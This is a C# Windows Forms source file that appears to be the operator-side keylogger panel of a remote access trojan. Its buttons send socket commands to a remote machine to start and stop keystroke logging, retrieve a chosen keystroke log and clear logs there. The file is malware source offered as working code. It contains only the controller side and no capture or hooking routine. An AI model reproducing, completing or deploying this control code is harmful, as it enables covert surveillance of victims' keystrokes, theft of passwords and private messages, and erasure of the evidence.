using System;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using System.Linq;

namespace SV
{
    public partial class Keylogger : MetroFramework.Forms.MetroForm
    {
        Socket sock;
        public string ID = "";
        public Keylogger(Socket s, string uniq)
        {
            InitializeComponent();
            ID = uniq;
            sock = s;
            button1.Click += button1_Click;
            button2.Click += button2_Click;
            button3.Click += button3_Click;
            button4.Click += button4_Click;
            metroTabControl1.SelectedIndex = 0;           
            textBox1.TextChanged += textBox1_TextChanged;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("KEYBASLAT", Encoding.UTF8.GetBytes("ECHO"));
                sock.Send(senddata, 0, senddata.Length, SocketFlags.None);              
            }
            catch (Exception) { }
            button1.Enabled = false; button2.Enabled = true;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("KEYDUR", Encoding.UTF8.GetBytes("ECHO"));
                sock.Send(senddata, 0, senddata.Length, SocketFlags.None);
                textBox1.SelectionStart = textBox1.Text.Length;                
            }
            catch (Exception) { }
            button1.Enabled = true; button2.Enabled = false;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (comboBox1.SelectedIndex > -1)
            {
                if (!string.IsNullOrEmpty(comboBox1.SelectedItem.ToString()) && comboBox1.SelectedItem.ToString() != "No logs.")
                {
                    try
                    {
                        byte[] senddata = Form1.MyDataPacker("KEYCEK", Encoding.UTF8.GetBytes(comboBox1.SelectedItem.ToString()));
                        sock.Send(senddata, 0, senddata.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (comboBox1.Items.Count > 0)
            {
                if(comboBox1.Items[0].ToString().Contains("No logs.")) { return; }
                try
                {
                    byte[] senddata = Form1.MyDataPacker("LOGTEMIZLE", Encoding.UTF8.GetBytes("ECHO"));
                    sock.Send(senddata, 0, senddata.Length, SocketFlags.None);
                }
                catch (Exception) { }
                comboBox1.Items.Clear();
            }
        }

        private void Keylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            button2.PerformClick();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            textBox1.SelectionStart = textBox1.Text.Length;
            textBox1.ScrollToCaret();
        }

        private void Keylogger_Load(object sender, EventArgs e)
        {
            panel2.BringToFront();
            panel6.BringToFront();
        }
    }
}
